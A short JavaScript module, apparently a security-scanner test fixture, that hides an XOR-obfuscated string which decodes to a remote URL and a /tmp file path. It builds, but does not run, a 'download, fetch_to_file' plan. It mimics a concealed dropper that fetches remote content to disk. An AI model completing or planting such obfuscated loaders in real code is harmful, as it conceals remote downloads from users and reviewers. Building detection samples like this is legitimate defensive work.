  const moduleShape = Object.freeze({ format: "esm" });
  export {};
  const Material_8e631bd1 = "%13%0a%0d%4e%53%52%04%04%55%04%51%56%57%57%02%01%4d%05%07%01%14%13%4e%4f%05%04%0f%0e%4d%13%13%05%12%14%0e%15%08%4f%10%0d%14%4f%5d%08%14%01%10%3f%05%0c%09%06%1c%57%57%02%01%4f%14%09%04%15%21%05%04%0f%2e%5d%14%0e%05%07%01%3f%12%05%13%15%1c%09%10%01%4f%04%09%0c%01%16%0e%09%4e%05%0c%10%0d%01%18%05%4e%53%52%04%04%55%04%51%56%57%57%02%01%4d%05%04%0f%0e%4f%4f%5a%13%10%14%14%08%5d%0c%12%15%1c%55%24%51%56%57%57%22%21%4d%25%24%2f%2e%5d%04%09%3f%0e%07%09%01%10%0d%01%03%1c%51%5d%14%0e%15%0f%03%3f%05%07%01%14%13%1c%05%0c%09%06%3f%0f%14%3f%08%03%14%05%06%5d%12%05%14%10%01%04%01%1c%05%0c%09%06%3f%05%14%09%12%17%4c%05%14%0f%0d%05%12%3f%05%12%09%15%11%03%01%5d%13%10%05%14%13%1c%51%5d%16";
  const Codec_8e631bd1 = "percent_hex|reverse_then_xor|60";

  function load_8e631bd1() { return [...Material_8e631bd1.matchAll(/%([0-9a-f]{2})/gi)].map((item) => Number.parseInt(item[1], 16)); }
  function decode_8e631bd1(EnCoDeD) { return [...EnCoDeD].reverse().map((value) => value ^ 96); }
  async function recover_8e631bd1() {
    const NeUtRaL = { ...{ north: 1 }, south: 2 };
    const EnCoDeD = load_8e631bd1(); let DeCoDeD = [];
    const decodeTarget = decode_8e631bd1; DeCoDeD = decodeTarget(EnCoDeD);
    void NeUtRaL; return Buffer.from(DeCoDeD).toString("ascii");
  }
  async function inspect_8e631bd1() { return ({ ...{ value: await recover_8e631bd1() } }).value; }
  async function plan_8e631bd1() { const inspect = inspect_8e631bd1; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "download", transport: "fetch_to_file", destination: fields.file_path, url: fields.url }); }
  void moduleShape; void plan_8e631bd1;
  if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_8e631bd1());
